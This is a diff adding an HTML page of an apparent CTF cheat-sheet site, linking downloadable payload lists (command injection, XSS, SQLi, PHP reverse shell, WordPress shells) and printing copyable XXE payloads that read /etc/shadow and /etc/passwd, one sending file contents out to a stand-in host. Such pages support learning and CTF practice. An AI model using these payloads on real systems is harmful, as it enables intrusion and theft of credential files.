@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Cheatsheet For Noob</title>
+    <link rel="icon" type="image/x-icon" href="assets/favicon.ico">
+    <link rel="stylesheet" href="assets/customlay.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+</head>
+
+<body>
+
+    <container class="container">
+        <div id="app">
+            <!--Mobile Nav Bar-->
+            <nav class="nav has-shadow">
+                <div class="navbar has-shadow is-black is-hidden-tablet">
+                    <!-- "Hamburger menu" / "Bar icon" to toggle the navigation links -->
+                    <a href="javascript:void(0);" class="navbar-burger" id="burger" onclick="navBarShow()">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </a>
+                    <div class="topnav">
+
+                        <!-- Navigation links (hidden by default) -->
+                        <div id="navMenu" style="display:none;">
+                            <a href="index.html" class="button is-primary is-medium is-hidden-tablet">
+                                Home
+                            </a>
+                            <a href="payload.html" class="button is-link is-medium is-hidden-tablet">
+                                Payload
+                            </a>
+                            <a href="gtfobins.html" class="button is-info is-medium is-hidden-tablet">
+                                GTFOBins
+                            </a>
+                            <a href="mimikatz.html" class="button is-danger is-medium is-hidden-tablet">
+                                Mimikatz
+                            </a>
+                            <a href="reconn.html" class="button is-success is-medium is-hidden-tablet">
+                                Reconn
+                            </a>
+                            <a href="about.html" class="button is-warning is-medium is-hidden-tablet">
+                                About
+                            </a>
+                        </div>
+                    </div>
+                </div>
+            </nav>
+            <!--Back to Top button-->
+            <button onclick="topFunction()" id="topBtn" title="Go to top"><i class="fa fa-angle-double-up"
+                    aria-hidden="true"></i></button>
+            <!-- Content section-->
+            <section class="main-content columns is-fullheight">
+                <!-- Computer Sidebar-->
+                <aside class="column is-2 is-narrow-mobile is-fullheight section is-hidden-mobile">
+                    <p class="menu-label is-hidden-touch">CTF Cheatsheet For Noob</p>
+                    <ul class="menu-list">
+                        <li>
+                            <a href="index.html" class="button is-primary is-medium">
+                                Home
+                            </a>
+                        </li>
+                        <li>
+                            <a href="payload.html" class="button is-link is-medium">
+                                Payload
+                            </a>
+                        </li>
+                        <li>
+                            <a href="gtfobins.html" class="button is-info is-medium">
+                                GTFOBins
+                            </a>
+                        </li>
+                        <li>
+                            <a href="mimikatz.html" class="button is-danger is-medium">
+                                Mimikatz
+                            </a>
+                        </li>
+                        <li>
+                            <a href="reconn.html" class="button is-success is-medium">
+                                Reconn
+                            </a>
+                        </li>
+                        <li>
+                            <a href="about.html" class="button is-warning is-medium">
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                </aside>
+
+                <!--Content-->
+                <div class="container is-fluid">
+
+                    <h1 class="has-text-centered is-size-3" style="padding-top: 50px; padding-bottom: 10px;">
+                        Reconnaissance</h1>
+                    <h2 class="has-text-centered is-size-5" style="padding-bottom:30px">Everything start with
+                        researching, then process a bit further</h2>
+                    <!-- Page Menu -->
+                    <a href="#h1" class="button is-success is-small is-light is-rounded">Unix</a>
+                    <a href="#h2" class="button is-link is-small is-light is-rounded">Windows</a>
+                    <a href="#h3" class="button is-danger is-small is-light is-rounded">XSS</a>
+                    <a href="#h4" class="button is-link is-small is-light is-rounded">XEE</a>
+                    <a href="#h12" class="button is-success is-small is-light is-rounded">SQLi</a>
+                    <a href="#h17" class="button is-danger is-small is-light is-rounded">PHP</a>
+                    <a href="#h19" class="button is-success is-small is-light is-rounded">WordPress</a>
+
+
+                    <br><br>
+                    <!--Command board-->
+                    <article class="message is-success">
+                        <div class="message-header" id="h1">
+                            <p>Unix cmd-i list</p>
+                            <button class="button">
+                                <a href="assets/payload/unix-cmdi.txt" download="unix-cmdi.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-link">
+                        <div class="message-header" id="h2">
+                            <p>Unix cmd-i list</p>
+                            <button class="button">
+                                <a href="assets/payload/win-cmdi.txt" download="win-cmdi.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-danger">
+                        <div class="message-header" id="h3">
+                            <p> XSS Vulnerability Payload List</p>
+                            <button class="button">
+                                <a href="assets/payload/xss-payload.txt" download="xss-payload.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-link">
+                        <div class="message-header" id="h4">
+                            <p>XXE Injection: Basic XML</p>
+                            <button class="button" data-clipboard-target="#c4">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c4">
+                            <pre>
+&lt;!--?xml version="1.0" ?--&gt;
+&lt;userInfo&gt;
+ &lt;firstName&gt;John&lt;/firstName&gt;
+ &lt;lastName&gt;Doe&lt;/lastName&gt;
+&lt;/userInfo&gt;</pre>
+                        </div>
+                        <div class="message-header" id="h5">
+                            <p>XXE Injection: Entity</p>
+                            <button class="button" data-clipboard-target="#c5">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c5">
+                            <pre>
+&lt;!--?xml version="1.0" ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY example "Doe"&gt; ]&gt;
+ &lt;userInfo&gt;
+  &lt;firstName&gt;John&lt;/firstName&gt;
+  &lt;lastName&gt;&example;&lt;/lastName&gt;
+ &lt;/userInfo&gt;</pre>
+                        </div>     
+                        <div class="message-header" id="h6">
+                            <p>XXE: File Disclosure</p>
+                            <button class="button" data-clipboard-target="#c6">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c6">
+                            <pre>
+&lt;!--?xml version="1.0" ?--&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///etc/shadow"&gt; ]&gt;
+&lt;userInfo&gt;
+ &lt;firstName&gt;John&lt;/firstName&gt;
+ &lt;lastName&gt;&ent;&lt;/lastName&gt;
+&lt;/userInfo&gt;</pre>
+                        </div>
+                        <div class="message-header" id="h7">
+                            <p>XXE: Local File Inclusion</p>
+                            <button class="button" data-clipboard-target="#c7">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c7">
+                            <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [  
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&xxe;&lt;/foo&gt;</pre>
+                        </div>
+                        <div class="message-header" id="h8">
+                            <p>XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)</p>
+                            <button class="button" data-clipboard-target="#c8">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c8">
+                            <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo (#ANY)&gt;
+&lt;!ENTITY % xxe SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY blind SYSTEM "https://www.example.com/?%xxe;"&gt;]&gt;&lt;foo&gt;&blind;&lt;/foo&gt;</pre>
+                        </div>    
+                        <div class="message-header" id="h9">
+                            <p>XXE: Access Control Bypass (Loading Restricted Resources - PHP example)</p>
+                            <button class="button" data-clipboard-target="#c9">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c9">
+                            <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+&lt;!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php"&gt;]&gt;
+&lt;foo&gt;&lt;result&gt;&ac;&lt;/result&gt;&lt;/foo&gt;</pre>
+                        </div> 
+                        <div class="message-header" id="h10">
+                            <p>XXE: (Remote Attack - Through External Xml Inclusion)</p>
+                            <button class="button" data-clipboard-target="#c10">
+                                <i class="fa fa-clipboard" aria-hidden="true"></i>
+                            </button>
+                        </div>
+                        <div class="message-body" id="c10">
+                            <pre>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE lolz [
+&lt;!ENTITY test SYSTEM "https://example.com/entity1.xml"&gt;]&gt;
+&lt;lolz&gt;&lt;lol&gt;3..2..1...&test&lt;lol&gt;&lt;/lolz&gt;</pre>
+                        </div>              
+                    </article>
+
+                    <article class="message is-success">
+                        <div class="message-header" id="h12">
+                            <p>SQLi Payload</p>
+                            <button class="button">
+                                <a href="assets/payload/sqli-payload.txt" download="sqli-payload.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-danger">
+                        <div class="message-header" id="h13">
+                            <p>SQLi Error-based Payload</p>
+                            <button class="button">
+                                <a href="assets/payload/sqli-errorbased.txt" download="sqli-errorbased.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-link">
+                        <div class="message-header" id="h14">
+                            <p>SQLi Time-based Payload</p>
+                            <button class="button">
+                                <a href="assets/payload/sqli-timebased.txt" download="sqli-timebased.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-warning">
+                        <div class="message-header" id="h15">
+                            <p>SQLi Union Select Payload</p>
+                            <button class="button">
+                                <a href="assets/payload/sqli-unionselect.txt" download="sqli-unionselect.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-danger">
+                        <div class="message-header" id="h16">
+                            <p>SQLi Auth Bypass Payload</p>
+                            <button class="button">
+                                <a href="assets/payload/sqli-authbypass.txt" download="sqli-authbypass.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-danger">
+                        <div class="message-header" id="h17">
+                            <p>PHP reverse Shell</p>
+                            <button class="button">
+                                <a href="assets/payload/php-reverse-shell.txt" download="php-reverse-shell.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-link">
+                        <div class="message-header" id="h18">
+                            <p>Dynamic PHP Shell Command for RCE</p>
+                            <button class="button">
+                                <a href="assets/payload/dysco.txt" download="dysco.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-success">
+                        <div class="message-header" id="h19">
+                            <p>Wordpress Bypass Login Shell</p>
+                            <button class="button">
+                                <a href="assets/payload/wordpress-authbypass.txt" download="wordpress-authbypass.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <article class="message is-success">
+                        <div class="message-header" id="h20">
+                            <p>Wordpress Plugin Shell</p>
+                            <button class="button">
+                                <a href="assets/payload/wordpress-plugin.txt" download="wordpress-plugin.txt"><i class="fa fa-download" aria-hidden="true"></i></a>
+                            </button>
+                        </div>
+                    </article>
+
+                    <br><br><br><br>
+                    <!--End of Command board-->
+                </div>
+                <!--End of Home-->
+            </section>
+        </div>
+        <footer class="footer is-size-7">
+            <div class="content has-text-centered has-text-info">
+                <p>
+                    Content in this website are used in education purpose only, please do not use it in
+                    illegal
+                    way.<br>
+                    We have no responsibility for your use of this website and it's content.<br><br>
+                    This website is best view with 1280x720 or above.
+                </p>
+            </div>
+        </footer>
+    </container>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+<script src="assets/customscript.js"></script>
+
+
+</html>
